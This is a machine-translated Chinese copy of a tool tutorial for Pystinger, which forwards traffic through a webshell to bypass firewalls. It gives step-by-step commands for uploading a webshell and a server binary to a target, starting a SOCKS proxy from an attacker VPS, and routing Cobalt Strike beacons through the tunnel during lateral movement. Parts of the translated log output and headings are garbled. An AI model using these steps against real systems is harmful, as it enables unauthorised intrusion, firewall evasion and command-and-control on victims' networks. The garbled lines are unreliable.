# Pystinger:使用 Webshell 绕过防火墙进行流量转发

> 原文：<https://kalilinuxtutorials.com/pystinger-bypass-firewall-for-traffic-forwarding-using-webshell/>

[![Pystinger : Bypass Firewall For Traffic Forwarding Using Webshell](img/3ee7c86ee5482aa86db580a952b3eb7b.png "Pystinger : Bypass Firewall For Traffic Forwarding Using Webshell")](https://1.bp.blogspot.com/-7DKF_9JdRZE/YKEP97CeheI/AAAAAAAAJG0/lBBPdUIQrU4hyJLHIgCHGB3dNbCNI0yYQCLcBGAsYHQ/s728/tunnel%25281%2529.png)

**Pystinger** 通过 webshell 实现 **SOCK4 代理**和**端口映射**。它可以直接由 metasploit-framework、viper、cobalt strike 用于在线会话。Pystinger 是用 python 开发的，目前支持三种代理脚本:php、jsp(x)和 aspx。

**用途**

假设服务器的域名是[http://example.com:8080](http://192.168.3.11:8080/)服务器内网的 IP 地址是 192.168.3.11

**SOCK4 代理**

*   `**proxy.jsp**`上传到目标服务器并确保【http://example.com:8080/proxy.jsp】的[能够访问，页面返回 **`UTF-8`**](http://example.com:8080/proxy.jsp)
*   `**stinger_server.exe**`上传到目标服务器，运行 cmd `start **D:/XXX/stinger_server.exe**`启动 pystinger-server

> 不要直接运行`**D:/xxx/singer_server.exe**`，会造成 TCP 断网

*   在你的 VPS 上运行 **`./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000`**
*   您将看到以下输出

**root@kali:~#。/stinger _ client-w http://example.com:8080/proxy.jsp-l 127 . 0 . 0 . 1-p 60000
2020-01-06 21:12:47673–信息–619–本地监听检查…
2020-01-06 21:12:47674–信息–622–本地监听检查通过
2020-01-06 21:12:47674–信息–信息 远程服务器检查…
2020-01-06 21:12:47，696–INFO–644–远程服务器检查通过
2020-01-06 21:12:47，696–INFO–645–服务器配置—
2020-01-06 21:12:47，696–INFO–647–client _ address _ list =>[] 2020-01-06 21:12:47，696–INFO–647–SERVER _ LISTEN =>127 . 0 . 0 . 1:60010
2020-01-06 21:12:47，696–INFO–647–LOG _ LEVEL =>INFO
2020-01-06 21:12:47，697–INFO
2020-01-06 21:12:47697–INFO–647–READ _ BUFF _ SIZE =>51200
2020-01-06 21:12:47697–INFO–673–TARGET _ ADDRESS:127 . 0 . 0 . 1:60020
2020-01-06 21:12:47697 开始
2020-01-06 21:12:47，703–警告–502–socks 4a 服务器于 127.0.0.1:60000 开始
2020-01-06 21:12:47，703–警告–509–socks 4a 准备接受**

*   现在你已经在`**example.com**`的内网 VPS `**127.0.0.1:60000**`上启动了一个 *socks4a 代理*。
*   现在目标服务器 **( `example.com` ) `127.0.0.1:60020`** 已经映射到 VPS `**127.0.0.1:60020**`

C **多目标全球打击在线信标**

*   `**proxy.jsp**`上传到目标服务器并确保【http://example.com:8080/proxy.jsp】的[能够访问，页面返回 **`UTF-8`**](http://example.com:8080/proxy.jsp)
*   `**stinger_server.exe**`上传到目标服务器，运行 cmd `**start D:/XXX/stinger_server.exe 192.168.3.11**`启动 pystinger-server (192.168.3.11 是目标的内网 IP 地址)

> 192.168.3.11 可以更改为 0.0.0.0

*   在你的 VPS 上运行`**./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000**`
*   您将看到以下输出

**root@kali:~#。/stinger _ client-w http://example.com:8080/proxy.jsp-l 127 . 0 . 0 . 1-p 60000
2020-01-06 21:12:47673–信息–619–本地监听检查…
2020-01-06 21:12:47674–信息–622–本地监听检查通过
2020-01-06 21:12:47674–信息–信息 远程服务器检查…
2020-01-06 21:12:47，696–INFO–644–远程服务器检查通过
2020-01-06 21:12:47，696–INFO–645–服务器配置—
2020-01-06 21:12:47，696–INFO–647–client _ address _ list =>[] 2020-01-06 21:12:47，696–INFO–647–SERVER _ LISTEN =>127 . 0 . 0 . 1:60010
2020-01-06 21:12:47，696–INFO–647–LOG _ LEVEL =>INFO
2020-01-06 21:12:47，697–INFO
2020-01-06 21:12:47697–INFO–647–READ _ BUFF _ SIZE =>51200
2020-01-06 21:12:47697–INFO–673–TARGET _ ADDRESS:127 . 0 . 0 . 1:60020
2020-01-06 21:12:47697 开始
2020-01-06 21:12:47，703–警告–502–socks 4a 服务器于 127.0.0.1:60000 开始
2020-01-06 21:12:47，703–警告–509–socks 4a 准备接受**

*   在 cobaltstrike 上添加监听器，监听器端口是`**60020**`(输出的`**RAT CONFIG**`中的处理程序/监听端口)，监听器地址是`**192.168.3.11**`
*   生成有效负载，上传到目标并运行。
*   当横向移动到其他主机时，可以将有效载荷指向 192.168.3.11:60020 以使信标在线

**自定义标题和代理**

*   如果 webshell 需要配置 cookie 或授权，可以通过— header 参数`**--header "Authorization: XXXXXX,Cookie: XXXXX"**`配置请求头
*   如果需要通过代理访问 webshell，可以通过代理`**--proxy "socks5:127.0.0.1:1081"**`设置代理

[**Download**](https://github.com/FunnyWolf/pystinger#cobaltstrikes-beacon-online-for-single-target)